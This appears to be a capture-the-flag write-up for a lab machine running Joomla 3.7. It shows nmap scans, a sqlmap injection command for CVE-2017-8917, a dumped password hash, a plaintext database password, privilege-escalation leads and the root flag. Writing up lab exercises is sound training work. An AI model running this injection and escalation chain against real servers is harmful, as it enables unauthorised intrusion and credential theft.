Enumeration with NMAP :

```
sudo nmap -Pn -sV 10.10.130.131
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-13 05:02 EST
Nmap scan report for 10.10.130.131
Host is up (0.045s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
```

```
sudo nmap -Pn -sV -sC 10.10.130.131
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-13 05:02 EST
Nmap scan report for 10.10.130.131
Host is up (0.043s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.01 seconds
```

We can see 3 main services. SSH/HTTP and a MariaDB.

![[Pasted image 20221113110836.png]]
We find out that it is a joomla CMS.

I found : http://10.10.130.131/README.txt
And it seems that it is a version 3.7. 
I found a *joomscan* tool on kali !
This tool confirms that it is a version 3.7 
So let's check for vulnerabilities on exploit.db

I found 1CVE regarding SQL injections.  : CVE-2017-8917

https://www.exploit-db.com/exploits/42033

```
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

## Access the web server, who robbed the bank?
--- 
![[Pasted image 20221113110709.png]]

Spiderman robbed the bank !


Let's use as suggested joomblah ! 
And we get the user hash : 
```
[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

Use john !
password is blowfish hash

![[Pasted image 20221113124036.png]]
blowfish gpu resistant that's long !

In /var/www/html/configuration.php we find a local password : nv5uz9r3ZEDzVjNu
Now time to privesc
So let's use linpeas

I found 
- CVE-2021-4034
- writable path abuse
- dirty cow 
- ...


I found sudo rights with jjameson
So i checked on gtfobin
and root.txt : eec3d53292b1821868266858d7fa6f79
